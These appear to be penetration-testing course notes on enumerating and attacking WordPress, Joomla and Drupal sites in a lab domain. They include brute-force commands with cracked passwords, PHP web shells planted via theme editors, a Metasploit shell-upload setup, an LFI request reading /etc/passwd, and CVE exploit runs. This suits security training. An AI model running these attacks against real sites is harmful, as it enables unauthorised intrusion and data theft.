
# 📘 Application Discovery & Enumeration

## 📍 Purpose
- Maintain an **asset inventory** of all devices, software, and applications.
- Detect rogue or shadow IT, outdated applications, weak/default credentials, and unpatched vulnerabilities.
- Improve visibility and defensive posture.
- Help clients find gaps **before attackers do**.

## 🧭 Methodology Overview

### 🔍 Initial Steps
1. Start with **black box discovery** or provided scope.
2. Perform **ping sweep** to identify live hosts.
3. Run **targeted Nmap scan** for common web ports:

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
````

4. Use tools like **EyeWitness** or **Aquatone** for web screenshotting.

## 📂 Example Scope List

```
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
...
10.129.201.50
```

## 🛠 Tools & Usage

### 🧾 EyeWitness

#### ✅ Install

```bash
sudo apt install eyewitness
```

#### ✅ Run Against Nmap Output

```bash
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

#### 📌 Features

* Takes screenshots using Selenium.
* Supports XML input (Nmap, Nessus).
* Fingerprints apps and suggests default creds.

### 🧾 Aquatone

#### ✅ Download

```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
```

#### ✅ Run with Nmap XML

```bash
cat web_discovery.xml | ./aquatone -nmap
```

#### 📌 Features

* Screenshots and organizes web hosts.
* Categorizes results: High Value, CMS, Forbidden, Splash, etc.
* Fast and lightweight.

## 📝 Notetaking Template

### Notebook Structure Example (OneNote / Notion / Cherrytree / etc.)

```
External Penetration Test - <Client Name>
│
├── Scope
│   ├── CIDR/IPs
│   ├── URLs
│   ├── Fragile Hosts
│   └── Timeframes & Limitations
│
├── Client POCs
├── Credentials
├── Discovery / Enumeration
│   ├── Live Hosts
│   └── Scans (Nmap, Masscan, Nessus, etc.)
│
├── Application Discovery
│   ├── EyeWitness / Aquatone Reports
│   ├── Interesting Hosts
│   └── Potential Vulnerabilities
│
├── Exploitation
│   ├── <Hostname/IP>
│   └── ...
│
└── Post-Exploitation
    ├── <Hostname/IP>
    └── ...
```

### 📌 Enumeration Notes

* Timestamp and log all scans with syntax and target details.
* Highlight interesting subdomains (e.g., `dev`, `qa`, `acc`, `-dev`, `-test`).
* Track software versions, login portals, and Vhosts.
* Mark High-Value Targets (e.g., GitLab, Jenkins, Splunk, Tomcat, CMS).


### 🚨 Tips for Assessments

* **Don’t rely solely on scanners** – manual validation is essential.
* Always **explore built-in functionality** (e.g., file uploads, API endpoints).
* Dev/staging servers often have **lax security controls**.
* Review the **entire screenshot report**, even buried entries may be valuable.
* Avoid rabbit holes early in enumeration; **stay high-level** until discovery is complete.


---

# 🕵️‍♂️ WordPress - Discovery & Enumeration Notes

## 🌐 Target Overview

* **Target URL:** `http://blog.inlanefreight.local`
* **CMS:** WordPress
* **WordPress Version:** 5.8 (vulnerable)

## 🧰 Manual Discovery Summary

### 🔍 Initial Indicators of WordPress

* Accessible files:

  * `/robots.txt` (contains `/wp-admin`, `/wp-content`)
  * `/wp-login.php` (login page)
  * `/xmlrpc.php` (XML-RPC enabled)
* HTML metadata reveals WordPress version:

  ```html
  <meta name="generator" content="WordPress 5.8" />
  ```

### 🎨 Themes
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
* **Theme:** `Transport Gravity` (Child of Business Gravity)
* **Version:** 1.0.1
* **Directory Listing:** Enabled
* **Style URI:** [transport-gravity/style.css](http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css)

### 🔌 Plugins Identified

```
curl -s http://blog.inlanefreight.local/ | grep plugins
```
| Plugin Name    | Version | Vulnerabilities                               |
| -------------- | ------- | --------------------------------------------- |
| Contact Form 7 | 5.4.2   | Not confirmed vulnerable in scan              |
| Mail Masta     | 1.0.0   | ✅ LFI, ✅ SQL Injection                        |
| wpDiscuz       | 7.0.4   | ✅ Unauthenticated Remote Code Execution (RCE) |

> ✅ Plugin directories [](http://blog.inlanefreight.local/wp-content/plugins) have directory listing enabled and `readme.txt` files exposed.

### 👤 User Enumeration

try various logins at /wp-login.php

* **Valid Users Discovered:**

  * `admin`
  * `john`

* **Username Enumeration:** Supported via login error message differences:

  * Valid username → "Incorrect password"
  * Invalid username → "Username not registered"


## ⚙️ WPScan Automated Findings

### 🔧 Scan Command Used:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>
```

### 🔍 Key Findings:

* **WordPress Version:** 5.8
* **XML-RPC:** Enabled (`/xmlrpc.php`)
* **Upload Directory:** Listing enabled (`/wp-content/uploads/`)
* **Theme:** `Transport Gravity`, version 1.0.1
* **Plugin Vulnerabilities:**

  * Mail Masta 1.0:

    * ✅ LFI
    * ✅ SQLi
* **Users Enumerated:**

  * `admin`
  * `john`

## 🧠 Analysis & Next Steps

### 🛠 Vulnerabilities of Interest

* **wpDiscuz 7.0.4**: 🔥 *Unauthenticated RCE*
* **Mail Masta 1.0**:

  * 🐚 *Local File Inclusion*
  * 🐞 *SQL Injection*

### 🛡 Other Opportunities

* Exploit user enumeration via brute-force (XML-RPC or login page)
* Directory listings may expose sensitive files
* Consider fingerprinting theme/plugins not found in WPScan manually

---

# 🛠️ Attacking WordPress

## 🎯 Objective

Gain initial access to a WordPress-based web server by abusing weak credentials, misconfigurations, and known vulnerabilities in plugins/themes.


## 🔍 Step 1: Enumerate Users and Plugins

Tools like **WPScan** are used to enumerate:

* WordPress **version**
* Installed **plugins** & **themes**
* **Users**

Example WPScan command for enumeration:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate u,ap,vt
```

## 🚪 Step 2: Brute Force Login Credentials

### 📌 Method: `xmlrpc` (preferred for speed)

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

✅ Success:

```
Username: john
Password: firebird1
```


## 🧬 Step 3: Code Execution via Theme Editor

### 🖥️ Login to WordPress Admin Panel:

URL: `http://blog.inlanefreight.local/wp-login.php`

### 🛠️ Modify an Inactive Theme (e.g., `Twenty Nineteen`)

Navigate:

```
Appearance > Theme Editor > Select Theme > 404.php
```

### 💻 Inject a PHP web shell:

```php
<?php system($_GET[0]); ?>
```

### 🧪 Test Shell Access:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```


## ⚙️ Step 4: Automated Shell Upload via Metasploit

### 🧰 Use `wp_admin_shell_upload` module:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 10.129.42.195
set vhost blog.inlanefreight.local
set username john
set password firebird1
set lhost 10.10.14.15
exploit
```

💥 Opens Meterpreter session as `www-data`.


## 🧨 Step 5: Exploiting Vulnerable Plugins

### 🧵 mail-masta (Unauthenticated LFI)

Vulnerable code:

```php
include($_GET['pl']); // No sanitization!
```

Exploit:

```bash
curl "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

### 🪓 wpDiscuz 7.0.4 (Unauthenticated RCE)

* Vulnerability: **File upload bypass** via image upload feature
* CVE: **CVE-2020-24186**

Exploit script:

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

Upload Result:

```bash
http://blog.inlanefreight.local/wp-content/uploads/2021/08/<shell>.php?cmd=id
```

## 🧹 Post-Exploitation & Clean-up

🧾 Add the following to your report:

* **Exploited systems** (IP/hostname + vector)
* **Compromised users** (username, creds, access level)
* **Artifacts** (web shells, payloads, logs)
* **Modifications** (user creation, privilege changes)

📌 Clean up:

* Remove uploaded shells (e.g., `.php` files in uploads or plugin dirs)
* Remove added users or changes made during testing

---

# Joomla - Discovery & Enumeration

## Overview

Joomla is a free and open-source CMS, released in August 2005. It is widely used for:

* Forums, galleries, eCommerce, user communities
* Written in **PHP** with **MySQL** backend
* Enhanced by 7,000+ extensions and 1,000+ templates

## API Enumeration

Query Joomla’s CMS version stats:

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

Returns data such as:

```json
"total": 2776276,
"cms_version": {
    "3.9": 30.28,
    "3.6": 24.29,
    "3.8": 18.84,
    ...
}
```

## Discovery Techniques

### Initial Fingerprinting

**Identify via meta tag:**

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Returns:

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

### robots.txt Check

Common Joomla `robots.txt` disallows:

```
Disallow: /administrator/
Disallow: /components/
Disallow: /modules/
...
```

### Favicon

Can be used for visual fingerprinting (not always unique).

### README.txt

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

May show:

```
* Joomla! installation/upgrade package to version 3.x
* Joomla! 3.9 version history - https://docs.joomla.org/...
```

### XML Manifest

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Look for `<version>` tag:

```xml
<version>3.9.4</version>
```

### cache.xml

Also useful for approximate version info:

```bash
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```

## Enumeration Tools

### droopescan

Install:

```bash
sudo pip3 install droopescan
```

Run:

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```

**Findings:**

* Possible versions: 3.8.7 - 3.8.13
* Interesting URLs:

  * `joomla.xml`
  * `administrator/`
  * `LICENSE.txt`
  * `cache.xml`



### JoomlaScan (Python 2.7)

Install dependencies:

```bash
sudo python2.7 -m pip install urllib3 certifi bs4
```

Run:

```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

**Findings:**

* Components: `com_actionlogs`, `com_admin`, `com_ajax`, `com_banners`
* Explorable directories and LICENSE files


## Authentication Brute Force

Default Joomla admin username is `admin`. Password is set during installation.

### Attempt brute-force with weak credentials

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

**Successful login:**

```plaintext
admin:admin
```

---

# Attacking Joomla

## Objective
Gain access to the internal environment of a Joomla-based e-commerce site to perform enumeration or post-exploitation activities.

## 🎯 Abusing Built-In Functionality

### 1. Admin Panel Login
- Target: `http://dev.inlanefreight.local/administrator`
- Credentials: `admin:admin`

### 2. Fixing Login Error
If you encounter:

"An error has occurred. Call to a member function format() on null"

- Navigate to: `http://dev.inlanefreight.local/administrator/index.php?option=com_plugins`
- Disable: `Quick Icon - PHP Version Check` plugin

### 3. Template-Based RCE
- Go to: **Templates** → Select `protostar` → Edit `error.php`
- Insert PHP Web Shell:
  ```php
  <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>

* Save & Close

### 4. Confirm Execution

```bash
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

Expected Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 🔐 Best Practices

* Use non-obvious filenames/parameters
* Limit access (e.g., by IP or password)
* Clean up the shell after use
* Document: file name, hash, and location for reporting

## 🧨 Leveraging Known Vulnerabilities

### CVE-2019-10945

* **Type**: Directory Traversal & Authenticated File Deletion
* **Affected**: Joomla 1.5.0 – 3.9.4
* **Target Version**: Joomla 3.9.4

### Usage

Use the exploit script:

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

### Outcome

Lists webroot directories:

```
administrator
components
images
includes
modules
templates
...
configuration.php
index.php
```

> This vulnerability can be used to read or delete sensitive files if accessible via the browser.

---

# 🧭 Drupal - Discovery & Enumeration

## 📘 Overview
- **Drupal** is an open-source CMS written in PHP.
- Supports: **MySQL**, **PostgreSQL**, and **SQLite**.
- Enhancements: **Themes** and **Modules** (43,000+ modules, 2,900+ themes).
- Major users: **Tesla**, **Warner Bros Records**, many governments, and universities

## 🔍 Discovery / Footprinting

### Identifying Drupal
Ways to identify a Drupal CMS:
- Page source includes `Powered by Drupal` or `<meta name="Generator" ...>`
- Standard Drupal **logo**
- Presence of `/CHANGELOG.txt` or `/README.txt`
- Clues in `/robots.txt` like `/node`

### Example:
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
````

Output:

```html
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

### Node Enumeration

Drupal content uses `/node/<id>` structure (e.g., `/node/1`)

## 👥 Default User Types

1. **Administrator**: Full control
2. **Authenticated User**: Limited access (based on permissions)
3. **Anonymous**: Default visitor, usually read-only


## 🛠 Enumeration Techniques

### 1. Access CHANGELOG.txt

Older versions might expose this file:

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Output:

```
Drupal 7.57, 2018-02-21
```

If blocked:

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
# 404 Not Found
```

### 2. Droopescan

Droopescan offers rich Drupal scanning functionality.

#### Run:

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

#### Output:

```
[+] Plugins found:
    php http://drupal.inlanefreight.local/modules/php/
         http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login
```

### Interpretation

* Likely running **Drupal 8.9.1**
* No obvious core vulnerabilities at time of writing
* Next steps: Inspect **installed modules** and check for **abusable functionality**

---

